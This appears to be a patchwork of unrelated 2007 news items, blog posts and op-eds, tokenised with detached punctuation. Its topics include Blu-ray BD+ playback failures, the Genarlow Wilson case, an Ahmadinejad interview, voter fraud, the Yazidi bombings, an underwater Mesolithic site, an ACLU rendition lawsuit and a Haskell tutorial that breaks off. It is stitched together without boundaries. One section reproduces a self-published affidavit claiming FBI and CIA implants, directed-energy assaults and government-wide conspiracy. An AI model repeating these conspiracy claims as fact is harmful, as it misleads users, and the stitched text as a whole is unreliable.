The same fate is in store for owners of LG 's first - generation dual - format BH100 player .
Owners of the most popular Blu-ray disc player , Sony 's PlayStation 3 , are able to view both movies without issue , as long as they have updated their unit with the latest firmware version , 1.93 .
The Sony S1 and various Panasonic models can play the movie , but have the aforementioned slow load time issue .
Samsung 's older BD - 1000 will play the movie but will skip uncontrollably .
So what is the issue with these titles ?
Both make use of advanced features that utilize BD - J , the Java virtual machine that is part of the Blu-ray spec .
Silver Surfer uses BD - J to add a more dubious " feature " — the BD + copy protection that is layered on top of Blu- ray discs ' existing AACS copy protection .
While some have claimed that it is BD - J that is at fault and not BD+ , the latter requires the former to operate ( it runs in a Java virtual machine ) , and a quick perusal of what BD + actually does indicates that it is quite likely the culprit .
BD + is being rushed out to titles only shortly after the spec was finalized , partly in response to hackers cracking the protection on AACS earlier this year .
This would n't be the first time that extra layers of copy protection have harmed legitimate consumers : earlier this year Sony had to recall 20 DVD titles protected with ARccOS that caused problems on some DVD players .
When Paramount recently announced that they were switching to HD DVD releases , one of the reasons a spokesperson gave Ars was that the Blu-ray spec was not " market - ready . "
Perhaps this is the sort of thing he meant .
Fox 's position is that the problem is entirely the fault of the player manufacturers .
Steve Feldstein ,
Fox senior VP of marketing communications , told Video Business that " consumers should lobby their hardware manufacturers to release firmware upgrades post haste " and that " the title was well - reviewed and playing well on updated players . "
This is small consolation for those folks with players that have n't been updated and those that can't be updated .
Perhaps
I 'm just old and curmudgeonly , but it seems crazy to me that one should ever have to worry about applying firmware updates to a standalone movie player .
Many of these players do n't have Ethernet ports , as the Blu-ray spec does n't require them .
Updating the firmware on these units involves downloading an .ISO from the web site , unpacking it , burning it onto a CD - R or CD - RW , putting the disc in the player , rebooting , following the prompts , and hoping that all goes well .
I do n't know , maybe I 'll just go out to see a movie tonight instead .
Mr. Wilson said he was in “ total disbelief ” when he first heard the news of the court ’s ruling from another inmate who had heard it on the radio .
“ It did n’t seem real , ” Mr. Wilson said .
“ I stopped trying to figure the courts out . ”
He got a laugh from reporters who asked where his welcome - home party would be .
“ It ’s not going to be any more parties for a while , ” he said .
Mr. Wilson , who is black , was 17 when he was caught on videotape having oral sex with a 15 - year - old girl at a drug - and alcohol - fueled New Year ’s Eve party in 2003 .
Mr. Wilson was convicted of aggravated child molestation for the act , a charge that carried a mandatory minimum prison term so harsh it shocked his jury and prompted an international outcry from critics who asserted that prosecutors had been overzealous and racially motivated .
The law , critics said , was meant to keep child molesters behind bars , not to curb teenage sexual activity .
The jury was not told of the mandatory sentence before it issued its verdict .

The year after Mr. Wilson was sentenced , the Georgia General Assembly changed the law to make consensual sex between teenagers a misdemeanor punishable by no more than a year in prison ; but the legislature declined to apply the law retroactively to Mr. Wilson .
That set up a test of wills between the lawmakers and judges , as Mr. Wilson ’s lawyer appealed to both camps to free her client , who had been an honors student and star athlete .
60 Minutes ' Scott Pelley sat down with Iranian president Mahmoud Ahmadinejad for what can only be termed a surreal interview .
Pelley was combative for most of the interview , White House talking points quite literally in hand .
Ahmadinejad 's responses were frustratingly equivocal .
It sparked a great debate in my home as to why ... if Ahmadinejad does want to reach some sort of detente with the rising escalation of war rhetoric , his dancing around direct questions did not truly help him .
But then again , Ahmadinejad 's smile also belied an annoyance with Pelley 's attitude , as his final comment indicated :
" This is not Guantanamo Bay .
This is not a Baghdad prison .
Please , this is not a secret prison in Europe .
This is not Abu Ghraib , " Ahmadinejad said .
" This is Iran .
I 'm the president of this country ! "
But what has to be the kicker of the interview is when Pelley asks Ahmadinejad ( who has been called a madman , a terrorist supporter and evil by Bush , mind you ) what he likes about President Bush .
Download Download video also available at CBS site ( h/t Scarce )
Ahmadinejad responds by asking what do Americans like about Bush .
Pelley 's answer ?
Bush is a religious man .
" As an American citizen tell me what trait do you admire ? " the president asked Pelley .
" Well Mr. Bush is without question a very religious man for example , as you are , " Pelley replied .
" What religion , please tell me , tells you as a follower of that religion to occupy another country and kill its people , please tell me , does Christianity tell its followers to do that ? "
Ahmadinejad asked .
When Pelley reads a statement from Bush to Ahmadinejad ( he 's now too cowardly to meet with world leaders on his own and relies on reporters to pass along messages ? ) , my irony meter redlined .

THE MAN BEHIND THE CURTAIN ….
The New York Times , in a genuine act of public service , has conducted an investigation into voter fraud .
Republicans claim it ’s rampant , and the only way to stop it is via strict voter ID laws that — purely by coincidence — happen to have the effect of reducing turnout among several traditionally Democratic constituencies .
So what ’s the score ?
By 2005 , four years after John Ashcroft had changed Department of Justice guidelines to streamline prosecutions , how much voter fraud had DOJ dug up ?
….about 120 people have been charged and 86 convicted as of last year .
Most of those charged have been Democrats , voting records show .
Many of those charged by the Justice Department appear to have mistakenly filled out registration forms or misunderstood eligibility rules , a review of court records and interviews with prosecutors and defense lawyers show . ….
In swing states , including Ohio and Wisconsin , party leaders conducted inquiries to find people who may have voted improperly and prodded officials to act on their findings .
But the party officials and lawmakers were often disappointed .
The accusations led to relatively few cases , and a significant number resulted in acquittals .
Here ’s the nickel summary :
In 2002 , DOJ changed their guidelines to make it easier to prosecute voter fraud .
They made it a priority to find voter fraud cases .
They appointed a clean slate of U.S. Attorneys loyal to the Republican Party .
They set up training classes to help prosecutors charge and win voter fraud cases .
But after all that , they managed to demonstrate fraud in a grand total of only 86 cases over four years .
And even then , many of the cases of confirmed fraud were simply mistakes , while virtually none of them were actually designed to affect the outcome of an election .
So in four years of concerted effort , the Bush Justice Department managed to come up with maybe half a dozen cases of actual voter fraud .
In other words , two or three per election cycle .
Mostly in rural districts for low - level offices .
And because of this , we ’re supposed to believe that it ’s a high priority to spend millions of dollars on voter ID laws that plainly do nothing except make it harder for poor people to vote .
Can we now please put this nonsense to rest ?
Can we please stop writing stories that treat voter ID laws as if they ’re sincerely designed to stop voter fraud ?
There ’s no longer any excuse .
POSTSCRIPT : This stuff can also ruin lives .
Be sure to check out the part of the story about the guy who was deported to Pakistan because he mistakenly filled out a voter registration card while standing in line at the DMV .
I ’m sure the prosecutor who brought that case is proud of himself .

Members of the Yazidi sect had been targeted before the blasts
Some 200 more were reported injured as at least four blasts hit areas home to the Yazidi sect near the city of Mosul .
The deadly attack was one of the most lethal insurgent strikes in more than four years of war in Iraq .
The US called the bombings " barbaric " , while a Kurdish official said Baghdad had failed to protect the Yazidi .
In a statement , the White House insisted US forces and the Iraqi government would continue to " beat back " the " vicious and heartless murderers " .
The BBC's Richard Galpin , in Baghdad , says that with the Americans concentrating on their military effort in the capital , officials fear the insurgents are moving into new areas where they can attack so - called soft targets .
A spokesman for the Kurdistan regional government , a semi-autonomous authority which governs three northern Iraqi provinces , described the Yazidi as a " threatened minority " and said Kurdish forces might have protected them from harm .
Because of the inaction of the government in Baghdad and their inability to protect the population they are suffering the way they are now

" We would certainly be able to improve security if we were allowed to operate in that area , " Khaled Salih told the BBC .
" But because of the inaction of the government in Baghdad and their inability to protect the population they are suffering the way they are now , " he added .
Tuesday 's co-ordinated bombings in the villages of Qataniya and Adnaniya involved a fuel tanker and three cars , officials said .
" My friend and I were thrown high in the air .
I still do n't know what happened to him , " Khadir Shamu , a 30 - year - old Yazidi , told the Associated Press news agency .
KEY FACTS : THE YAZIDIS Religious sect found in northern Iraq , Syria and the Caucasus Number about 500,000 worldwide , but largest number in northern Iraq Doctrine is an amalgam of pagan , Sabean , Shamanistic , Manichean , Zoroastrian , Jewish , Christian and Islamic elements Yazidis believe in a Supreme God , but do not believe in evil , sin , hell or the devil Violation of divine laws can be expiated by metempsychosis , or the transferring of a soul from one body to another Principal divine figure , Malak Taus ( Peacock Angel ) , is the supreme angel of the seven angels who ruled the universe after it was created by God
The mayor of Sinjal , a nearby town , said he expected the final death toll to rise .
" We are still digging with our hands and shovels because we can't use cranes because many of the houses were built of clay , " Dhakil Qassim told AP .
" We are expecting to reach the final death toll tomorrow or [ the ] day after tomorrow as we are getting only pieces of bodies .
Tensions between the Yazidi sect and local Muslims have grown since a Yazidi girl was reportedly stoned by her community in April for converting to Islam .
The sect is due to vote later alongside other Kurds outside the Kurdish autonomous region in a referendum on joining the grouping .
Correspondents say the planned referendum makes northern Iraq 's Kurds a target for politically - motivated attacks .
Yazidis worship an archangel , sometimes represented by a peacock figure believed by some Christians and Muslims to be the devil .
Erosion on the floor of the English Channel is revealing the remains of a busy Stone Age settlement , from a time when Europe and Britain were still linked by land , a team of archaeologists says .
The site , just off the Isle of Wight , dates back 8,000 years , not long before melting glaciers filled in the Channel and likely drove the settlement 's last occupants north to higher ground .
" This is the only site of its kind in the United Kingdom , " said Garry Momber , director of the Hampshire and Wight Trust for Maritime Archaeology , which led the recent excavations .
" It is important because this is the period when modern people were blossoming , just coming out of the end of the Ice Age , living more like we do today in the valleys and lowlands . "
End of Ice Age caused channel flood
Lobsters mucking around the seabed at the site about 10 years ago revealed a cache of Mesolithic flints , prompting further excavations that uncovered two hearths ( ancient ovens ) dangling precariously from the edge of an underwater cliff .
Burnt wood fragments gouged with cut marks and a layer of wood chippings were found lying under 35 feet of water during the latest dig .
Divers brought the material to the surface still embedded in slabs of the sea floor that were carried up in specially - designed boxes , which were then pieced back together and examined and dated in the lab .
" We now have unequivocal evidence of human activity at the site , " Momber told LiveScience .
" There were people here actively making stuff and being quite industrious . "
At 8,000 - years - old , the settlement is the only underwater Mesolithic site in Britain , though it is probably part of a much larger area of occupation yet to be uncovered , Momber said .
As the climate began to warm up near the end of the Ice Age about 10,000 years ago , people were moving into Northern Europe and settling down in the many river valleys left behind by melting glaciers , Momber explained .
Many of the valleys , such as the ones now beneath the English Channel , were eventually inundated completely when temperatures returned to normal .
" A good chunk of the material left behind from this cultural period is eventually going to be found underwater , " Momber said .
Underwater sites better preserved
Despite the logistical problems of underwater archaeology , the Isle of Wight site and others like it are usually better preserved than their counterparts on land , Momber said .
When the floodwater rose slowly in the English Channel , it deposited layers of silt atop the settlement , encasing it in an oxygen - free environment that preserves even organic materials such as wood and food .
" With underwater sites , all the trappings of a society are going to remain , not just the stone , " Momber said .
The trade - off is an environment that can carry away the precious remains at any time — a real concern at the Isle of Wight settlement .
" The erosion of this site would be a loss of information to humanity , not just the washing away of a bit of material , " he said .
" There is the potential to find so much more there ; there is so much to learn . "
Forget impeachment .
Liberals , put it behind you .
George W. Bush and Dick Cheney should n’t be treated like criminals who deserve punishment .
They should be treated like psychotics who need treatment .
Because they ’ve clearly gone mad .
Exhibit A : We ’re in the middle of a disastrous war in Iraq , the military and political situation in Afghanistan is steadily worsening , and the administration ’s interrogation and detention tactics have inflamed anti-Americanism and fueled extremist movements around the globe .
Sane people , confronting such a situation , do their best to tamp down tensions , rebuild shattered alliances , find common ground with hostile parties and give our military a little breathing space .
But crazy people ?
They look around and decide it ’s a great time to start another war .
That would be with Iran , and you ’d have to be deaf not to hear the war drums .
Last week , Bush remarked that “ if you ’re interested in avoiding World War III . . . you ought to be interested in preventing [ Iran ] from having the knowledge necessary to make a nuclear weapon . ”
On Sunday , Cheney warned of “ the Iranian regime ’s efforts to destabilize the Middle East and to gain hegemonic power . . . [ we ] cannot stand by as a terror - supporting state fulfills its most aggressive ambitions . ”
On Tuesday , Bush insisted on the need “ to defend Europe against the emerging Iranian threat . ”

Huh ?
Iran is now a major threat to Europe ?
The Iranians are going to launch a nuclear missile ( that they do n’t yet possess ) against Europe ( for reasons unknown because , as far as we know , they ’re not mad at anyone in Europe ) ?
This is lunacy in action .
Writing in Newsweek on Oct. 20 , Fareed Zakaria , a solid centrist and former editor of Foreign Affairs , put it best .
Citing Bush ’s invocation of “ the specter of World War III if Iran gained even the knowledge needed to make a nuclear weapon , ” Zakaria concluded that “ the American discussion about Iran has lost all connection to reality .
. . .
Iran has an economy the size of Finland ’s. . . .
It has not invaded a country since the late 18th century .
The United States has a GDP that is 68 times larger and defense expenditures that are 110 times greater .
Israel and every Arab country ( except Syria and Iraq ) are . . . allied against Iran .
And yet we are to believe that Tehran is about to overturn the international system and replace it with an Islamo - fascist order ?
What planet are we on ? ”
Planet Cheney .
Zakaria may be misinterpreting the president ’s remark about World War III though .
He saw it as a dangerously loopy Bush prediction about the future behavior of a nuclear Iran -- the idea being , presumably , that possessing “ the knowledge ” to make a nuclear weapon would so empower Iran ’s repressive leaders that they ’ll giddily rush out and start World War III .

But you could read Bush ’s remark as a madman ’s threat rather than a madman ’s prediction -- as a warning to recalcitrant states , from Germany to Russia , that do n’t seem to share his crazed obsession with Iran .
The message : Fall into line with administration policy toward Iran or you can count on the U.S.A. to try to start World War III on its own .
And when it comes to sparking global conflagration , a U.S. attack on Iran might be just the thing .
Yee haw !
You ’d better believe these guys would do it too .
Why not ?
They have nothing to lose -- they ’re out of office in 15 months anyway .
Apres Bush - Cheney , le deluge !
( Have fun , Hillary . )
But all this creates a conundrum .
What ’s a constitutional democracy to do when the president and vice president lose their marbles ?
The U.S. is full of ordinary people with serious forms of mental illness -- delusional people with violent fantasies who think they ’re the president , or who think they get instructions from the CIA through their dental fillings .
Advertisement
The problem with Bush is that he is the president -- and he gives instructions to the CIA and military , without having to go through his dental fillings .
Impeachment ’s not the solution to psychosis , no matter how flagrant .
But despite their impressive foresight in other areas , the framers unaccountably neglected to include an involuntary civil commitment procedure in the Constitution .
Still , do n’t lose hope .
By enlisting the aid of mental health professionals and the court system , Congress can act to remedy that constitutional oversight .
The goal : Get Bush and Cheney committed to an appropriate inpatient facility , where they can get the treatment they so desperately need .
In Washington , the appropriate statutory law is already in place :
If a “ court or jury finds that [ a ] person is mentally ill and . . . is likely to injure himself or other persons if allowed to remain at liberty , the court may order his hospitalization . ”
I ’ll even serve on the jury .
When it comes to averting World War III , it ’s really the least I can do .

Boeing Implicated In CIA Rendition Torture Scheme Posted by Pile ( 10170 views ) [ E - Mail link ]
The ACLU has brought a lawsuit against a Boeing subsidiary accused of falsifying flight plans to air traffic controllers to cover up CIA flights where people were " kidnapped " and tortured in foreign countries .
Two More Victims of CIA ’s Rendition Program , Including Former Guantánamo Detainee , Join ACLU Lawsuit Against Boeing Subsidiary ( 8/1/2007 )
Evidence of Company ’s Role in CIA Program Mounts
> Mohamed et al. v. Jeppesen Dataplan , Inc .
> El - Masri v. Tenet
Today , two additional victims of the United States government ’s unlawful “ extraordinary rendition ” program joined a lawsuit brought by the American Civil Liberties Union against Jeppesen Dataplan , Inc. , a subsidiary of Boeing Company .
The ACLU charges in its amended complaint that Jeppesen knowingly provided direct flight services to the CIA enabling the clandestine transportation of Bisher al - Rawi and Mohamed Farag Ahmad Bashmilah to secret overseas locations where they were subjected to torture and other forms of cruel , inhuman and degrading treatment .
“ Being a victim of the CIA ’s rendition program was horrific beyond words , ” said al - Rawi .
“ Regrettably , there are many more like me who have n’t been fortunate enough to be released .
No one should have to endure such illegal and inhumane treatment . ”
In addition to adding two more plaintiffs to the case , today ’s amended complaint cites further evidence of Jeppesen ’s involvement in the CIA ’s program .
Citing a report from the Council of Europe , the amended complaint alleges that Jeppesen intentionally submitted “ dummy flights ” to various aviation authorities in order to conceal the true flight paths of the rendition planes .
The ACLU ’s original complaint cited a New Yorker article that reported that a former Jeppesen employee informed the magazine that , at an internal corporate meeting , a senior Jeppesen official stated , " We do all of the extraordinary rendition flights - you know , the torture flights .
Let 's face it , some of these flights end up that way . "
( Jane Mayer , The New Yorker , Oct. 30 , 2006 . )
“ The more evidence we obtain , the more we learn about the magnitude of Jeppesen ’s role in the CIA ’s rendition program , ” said Anthony D. Romero , Executive Director of the ACLU .
" It is reprehensible for American corporations to profit from a government program involving kidnapping and torture .
The rendition program is unlawful , immoral , and anathema to American values .
Companies that choose to facilitate it should be held legally accountable . "
The ACLU ’s original complaint , filed on May 30 in the U.S. District Court for the Northern District of California , was initiated on behalf of Binyam Mohamed , Abou Elkassim Britel and Ahmed Agiza , three other victims of the CIA ’s rendition program .
The lawsuit charges that Jeppesen , through its travel service known as Jeppesen International Trip Planning , has been a main provider of flight and logistical support services for aircraft used by the CIA in the U.S. government 's extraordinary rendition program .
The CIA rendition flights transfer terror suspects to countries where the U.S. government knows detainees are routinely tortured or otherwise abused in contravention of universally accepted legal standards .
The lawsuit also charges that Jeppesen has facilitated flights to U.S. - run detention facilities overseas where the U.S. government maintains that the safeguards of its laws do not apply .
According to the lawsuit , since December 2001 , Jeppesen has provided flight and logistical support to at least 15 aircraft that have made a total of 70 rendition flights .
“ The support services provided by Jeppesen have been absolutely critical to the functioning of the government 's rendition program , " said Steven Watt , a staff attorney for the ACLU 's Human Rights Program .
Specifically , the ACLU alleges in its amended complaint that Jeppesen provided crucial support services to the CIA for the following flights involving al - Rawi and Bashmilah :
* In December 2002 , Iraqi citizen and British resident Bisher al - Rawi was stripped , dressed in a diaper , shackled , blindfolded , restrained in a harness , and flown from Banjul , Gambia to Kabul , Afghanistan where he was secretly detained , interrogated , and tortured at the secret U.S. - run detention facility known as the “ Dark Prison ” and then at the Bagram Air Base .
* In October 2003 , Yemeni citizen Mohamed Farag Ahmad Bashmilah was beaten , stripped , dressed in a diaper , shackled , blindfolded , hooded , strapped in an airplane , and flown from Jordan to Kabul , Afghanistan and then taken to Bagram Air Base where he was interrogated , tortured , and held incommunicado by the U.S. government for about six months .
“ Through the entire flight from Gambia to Kabul , I was on the verge of screaming , ” said al - Rawi .
“ I was terrified . ”
After their detentions in Afghanistan , al - Rawi and Bashmilah continued to endure brutal treatment in U.S. custody .
In February 2003 , al - Rawi was flown to the U.S. prison in Guantánamo Bay , Cuba .
He was released in March 2007 and now resides in England .
No charges have ever been brought against him .
In April 2004 , Bashmilah was again stripped , diapered , shackled , hooded , and transferred to a CIA “ black site ” in an unknown country where he was once again tortured .
In May 2005 , he was once again “ prepared ” for flight , this time to Yemen where he was detained for about nine months before being released .
The lawsuit was filed under the Alien Tort Statute , which permits aliens to bring claims in the United States for violations of the law of nations or a United States treaty .
The statute recognizes international norms accepted among civilized nations that are violated by acts such as enforced disappearance , torture and other inhuman treatment described in the lawsuit .
In a related case , the ACLU has petitioned the United States Supreme Court to review the case of Khaled El - Masri , an innocent German citizen who was also a victim of the government 's unlawful rendition program .
Although the story of El - Masri 's mistaken kidnapping and detention at the hands of the CIA is known throughout the world , his lawsuit was dismissed by the U.S. District Court for the Eastern District of Virginia after the government invoked the so - called " state secrets " privilege .
That decision was upheld by the U.S. Court of Appeals for the Fourth Circuit in March 2007 .
More information on the Jeppesen lawsuit , including copies of the original and amended complaints , as well as information on El - Masri 's case , can be found online at www.aclu.org/rendition
In addition to Watt , attorneys on the Jeppesen lawsuit are national ACLU Legal Director Steven Shapiro , Ben Wizner , Alexa Kolbi-Molinas and Jameel Jaffer of the national ACLU , Ann Brick of the ACLU of Northern California , Paul Hoffman of Schonbrun DeSimone Seplow Harris & Hoffman LLP , and Hope Metcalf of the Yale Law School Lowenstein Clinic .
In addition , Margaret L. Satterthwaite of the International Human Rights Clinic of New York University School of Law represents Mohamed Farag Ahmad Bashmilah , and Clive Stafford - Smith and Zachary Katznelson represent Binyam Mohamed .
Khaled El - Masri is represented by Watt , Wizner , Shapiro , Jaffer and Melissa Goodman of the national ACLU , Rebecca Glenberg of the ACLU of Virginia and Victor Glasberg of Victor M. Glasberg & Associates .

CJIS
Fbi's CJIS Corrupted & Used To Threaten People Globally
Autor(a )
geral sosbee
fbi seeks to intimidate ( through CJIS ) all who show NO " fbi respect " .
The CJIS must be removed from fbi control .
Personal information seized illegally by fbi is used to fabricate a fictitious profile on the Target .
The fbi , nervous over the recent global attention to fbi/cia crimes against Humanity as Sosbee and others outline , sends a message ( seen in the image below ) to Sosbee that the fbi demands " respect " .
Sosbee responds that VLAD demanded respect and when he received none , he impaled the Targets .
Today the fbi/cia impale in a metaphorical sense ( via physical and mental torture , forced suicide , murder , & disabling calumny globally - courtesy of fbi's CJIS ) anyone who exposes fbi/cia atrocities anywhere on earth ; these two evil and corrupt agencies ( and their members , associates and *** supporters ) control the * political parties in this country .
The thugs who run the ** fbi criminal justice information systems seek to instill fear in all citizens by threatening to ruin them with fabricated records entered into the CJIS .

AFFIDAVIT
STATE OF TEXAS
COUNTY OF CAMERON
On this 27th day of February , 2007 , appeared before me Geral W. Sosbee , an individual known personally to me to be the person who affixed his signature to this document below and who , being by me first duly sworn on his oath , deposed and said : " My name is Geral W. Sosbee ; I am over the age of 18 years .
I am fully competent in all manner to make this affidavit .
The information contained in this affidavit is within my personal knowledge , and is true and correct .
I am referred to below as Affiant .
I have documented by direct and incontrovertible evidence and personal testimony the criminal activities of dozens ( or perhaps hundreds ) of agents , operatives and handlers of the FBI and the CIA of the United States of America , including , but not limited to the following :
A. Obstruction of Justice , Suppression of Evidence , Perjury , Fabrication of Evidence , Criminal Conspiracy , Conspiracy to Violate and the Violation of Civil Rights , Attempted Extortion , Attempted Blackmail , False Arrest , False Imprisonment , Fraud Burglary , Robbery , Felonious Assault and Battery , Destruction of Personal Property , Petty Theft , Theft of and Tampering with U.S. Mail and a variety of other high crimes and misdemeanors as further described in paragraph " B " below .
B. Abuse of civil process , home and car invasions facilitated by physical and wireless electronic surveillance in home and car and further enhanced by the use of a tracking device implanted in the person of the human experimentee , the Affiant ; the surveillance of Affiant is ineffect as this affidavit is written and has been in effect twenty four hours a day , seven days a week , three hundred and sixty - five days a year , without cessation and without interruption for well over nine years world wide ; all such invasive surveillance is accompanied by various terrorist acts against the Affiant as further described in paragraph " C " below .
C. Repeated assault and battery on the person of the Affiant by street thugs and by the use of high technology authorized by the United States Government under a program known as Non-consensual Cover Research and Human Experimentation ; in this program the FBI and the CIA perform a wide variety of terrorist assaults on the Affiant ; one such assault is accomplished by the injection ( or placing ) into the Affiant various chemicals , bacterial and viral infections ; concomitant with the chemical and biological assaults the FBI and the CIA activate against the Affiant advanced Remote Electronic Human Behavior Influence Technology including psychoelectronic and directed energy assaults sometimes coordinated with fraudulently conceived and illegally carried out ( with local police authorities world wide ) attempted criminal sting operations designed to lead to the imprisonment or death of the Affiant ; also in conjunction with such hi- tech experimentations the Affiant is subjected to FBI and CIA psychological operations ( including conditioned response and operant conditioning techniques ) which are all designed to cause the Affiant to have a nervous breakdown , physical collapse or to otherwise seek final exit from the torturous campaign , the effects of which are often viewed in real time by the FBI and CIA tormentors who actually watch on computer screens the Affiant react to the injurious and painful dirty tricks and provocations described herein ; all such treasonous , inhumane and covert operations are carried out with the full support of all government entities at every level of society as further explained in paragraph " D " below .
D. All three branches of the United States Government ( and segments of the community at large ) are compliant with the mandates of FBI and CIA terrorist assaults as described above and all government officials at the local , state and federal levels pretend that no such criminal activity as described in the instant affidavit may occur ; thus , to date the Congress of the United States , the entire Judiciary and each and every employee of the Executive branch of the government of the United States of America may directly or indirectly support the terrorist activities of the FBI and the CIA as set forth herein and as further amplified in paragraph " E " below .
E. I hereby incorporate by reference into this affidavit and thereby make a part herein as though fully reproduced herein for all purposes the contents of my website ( and related links and statements by Affiant therein ) located at www.sosbeevfbi.com; this incorporation includes all statements , documents and other corroborating evidence provided , obtained or authorized by Affiant , including all updates by Affiant at www.newciv.org and any other internet site to date .
I hereby further certify and affirm under penalty of perjury of the laws of the United States and the laws of the state of Texas that all statements , including those incorporated by reference and made a part herein for all purposes as though fully reproduced herein are true and correct and that all documents ( including those incorporated by reference ) are true and correct copies of originals and that they are what they purport to be to the best of my knowledge and ability .
Further , Affiant sayeth Naught . "

Texas COLLAPSE OF CONSTITUTIONAL GOVERNMENT
OF USA
Posted by geral on 2008-06-30 14:17:35 The Responsibility For The Collapse Of The Constitutional
Government of The United States of America
the present task is to identify agencies and * individuals of the USA government who are responsible for the collapse of the constitutional democracy and the simultaneous formation of the current totalitarian state here .
As may be expected the criminals and the terrorists of the two premier homicidal groups ( i.e. : the fbi/cia ) are also the spearheads of the nation 's global intel operations , both overt and covert .**
Other intel groups take orders ( either directly or indirectly ) from the fbi and the cia .
due to the corruption , incompetence and outright felonious mindset of the members of the fbi/cia , all of the other intel arms of the USA government are unable to protect the country from the mounting threats by persons and countries who seek to stop this nation 's assault on Humanity .
The reason for the national intel failure , therefore , can be directly attributable to the fbi/cia and their foolish *** congressional and presidential Handlers .
http://www.sosbeevfbi.com/urgentmessagetot.html
as a result of this website and ( www.sosbeevfbi.com)
I have learned that the following intel groups study my material sometime in an apparent effort to comprehend why the fbi would attempt to frame ( or neutralize ) one of their own :
fbi- this group of thugs ostensibly operates under doj , but in reality the fbi is the boss ;
cia - this group of assassins is a nation unto itself , operating completely independently of the US governmnet ;
homeland security ( responsible for many threats and assaults on my person ) has an intel office manned by special agents and others who analyze data ;
dea has an intel office for national security matters , but dea is largely controlled by fbi/cia ; dea also pretends to function under the authority of doj ;
the dept of defense is top dog in military intel , but they too take orders ( or to put it mildly , " requests " from the fbi/cia ) - within this dod group are army , air force , navy , marines ( their respective intel offices ) ; also under the dod banner are the dia , nsa , nro ( national recon office ) , and the national geospacial intel office ( Note that this office has extensively analysed my sites and for this reason I came to learn of their existence as a highly specialized tech office coordinating data both from earth and space ) ;
the us department of state has its own office of intel which regularly reviews my material to determine whether I may be a candidate for a federal arrest warrant ;
The US depts of energy and treasury also each visit my sites in connection with their appraisals of finances , etc. , in connection with my material and visits thereto ;
the various intel groups have their own subgroups which also carry out mission oriented objectives globally .
For purposes of this report the reader should understand that the United States of America is run by the intel services and that these agencies are so completely corrupt in their operations and influence that no one can touch them .
* the names of fbi and cia agents , operatives , thugs , assassins , etc. , is a work in progress ; see my sites ( where I often identify perpetrators as operatives and agents who practice their evil trade ) , newspaper reports , and perform other inquiries to identify the government rat bastards who look to imprison , torture , kill anyone who stands in their path .

After the above report on the ' Collapse of USA ' the fbi turns up the intensity of the directed energy assaults against me , and thereby reveals an ability to completely incapacitate the Target at will .
On a scale of one to ten , previous assaults have been about a five ( or routinely about a four ) ; over the past few nights the intensity jumps to about six .
If the fbi and the cia elevate the intensity to eight , nine , or ten , I am certain that the Target would thereby have his brain entrained .
[ Also , the fbi and the cia have apparently removed from the search engines all ( or most ) references to the above article as of this date . ]

Federal judge orders White House to produce global warming report
" A federal judge ordered the Bush administration to issue two scientific reports on global warming , siding with environmentalists who sued the White House for failing to produce the documents , " AP reports Wednesday .
Excerpts :
U.S. District Court Judge Saundra Armstrong ruled Tuesday that the Bush administration had violated a 1990 law when it failed to meet deadlines for an updated U.S. climate change research plan and impact assessment .
Armstrong set a March 1 deadline for the administration to issue the research plan , which is meant to guide federal research on climate change .
Federal law calls for an updated plan every three years , she said .
The last one was issued in 2003 .
The judge set a May 31 deadline to produce a national assessment containing the most recent scientific data on global warming and its projected effects on the country 's environment , economy and public health .
The government is required to complete a national assessment every four years , the judge ruled .
The last report was issued by the Clinton administration in 2000 .
" It 's a huge victory holding the administration accountable for its attempts to suppress science , " Kassie Siegel , an attorney for the Center for Biological Diversity , one of the plaintiffs that filed suit told AP .

At the end of 2001 , the top 10 websites accounted for 31 % of all the pages viewed on the net .
By the end of last year , the top 10 accounted for fully 40 % of page views .
There are more destinations online , but we seem to be visiting fewer of them .
Much of the increase in traffic consolidation can , as MacManus points out , be attributed to the growth of social networks such as MySpace , Facebook and Bebo .
In 2001 , MySpace did n't even exist .
Now , the sprawling site , owned by Rupert Murdoch 's News Corporation , is the most visited on the net , accounting for a whopping 16 % of all page views .
The concentration is happening in other areas as well .
Take search engines .
According to Hitwise , Google now handles 65 % of all web searches , up from 58 % just a year ago .
Despite aggressive attempts by Yahoo ! , Microsoft and Ask to boost their own shares of the search market , Google continues to widen its lead .
If Google is an example of the shrinking of the Net , it 's also one of the causes .
Because the search engine determines a site 's relevance based on its popularity , as measured by , among other things , the number of other sites that link to it , it has had the effect of turning the web into a giant feedback loop .
The more popular a site becomes , the more it comes to dominate search results , which ends up funnelling ever more links and traffic to it .
On the internet , the big get bigger .
It was n't supposed to be like that .
When the web arrived in the early 1990s , it was heralded as a liberating force that would free us from the confines of gated communities like AOL and Compuserve .
The internet was supposed to be an open , democratic medium , an information bazaar putting individuals on the same footing as big companies .
In the end , though , the internet seems to be following the same pattern that has always characterised popular media .
A few huge outlets come to dominate readership and viewership and smaller , more specialised ones are consigned to the periphery .
Most of the largest sites are now in the midst of acquisition sprees or expansion programs intended to extend their dominion .
Just last week , MySpace announced it would buy Photobucket , the largest photo - sharing site ; Facebook said it would expand into the classified advertising business ; and Google chief executive Eric Schmidt said that his company has been acquiring small companies at the rate of one a week to build out its portfolio .
It may be that internet users will revolt against the dominance of the mega-sites .
But I would n't bet on it .
All the signs point to a continuing concentration of traffic within the fences of the new information plantations .

Learning Number Theory and Haskell : The Division Algorithm
This series of blog posts is a chronicle of my working my way through Gareth and Mary Jones ’ Elementary Number Theory and translating the ideas into the Haskell programming language .
This is the first installment of the series , which I ’m calling “ Learning Number Theory and Haskell . ”
( As a quick side note , I know many readers already know Haskell .
I hope this will get interesting for you soon , but my stated goal is to write for beginners … so you may want to skim the first few entries , or treat this as an opportunity to comment on whether I ’ve chosen the best way to present ideas for new Haskellers . )
The Jones text begins with a description of the “ division algorithm . ”
( If you ’re following along in the text , which I hope you are , I ’m combining theorem 1.1 with corollary 1.2 here . )
This is seemingly an odd name for a theorem , but here it is .
For all integers a and b , where b is not 0 , there is a unique q and r such that a = qb + r and 0 <= r < |b| .
The text calls these numbers the quotient and remainder .
I call them an excuse to go hunting through the Haskell standard library a bit .
There are a few candidates in the standard library for the divison of numbers into a quotient and remainder .
Haskell has quot and rem functions , which look promising .
It also has div and mod functions , though .
Let ’s play around a bit and see which ( if any ) do what we want .
Since I said I ’d start from the beginning , here ’s the beginning .
There are two commands to run GHC : ghc and ghci .
We will start out in GHCi , which allows you to type lines of Haskell code and have them evaluated immediately .
In some social circles , this is known as an REPL , which stands for “ Read - Eval - Print Loop ” .
It makes poking around a lot easier , since you do n’t need to save , recompile , or write a main function before seeing results .
Later on , we can use the ghc command to compile programs or libraries that can be run on their own .
$ ghci - fglasgow - exts
( I added an option there that I have n’t mentioned yet .
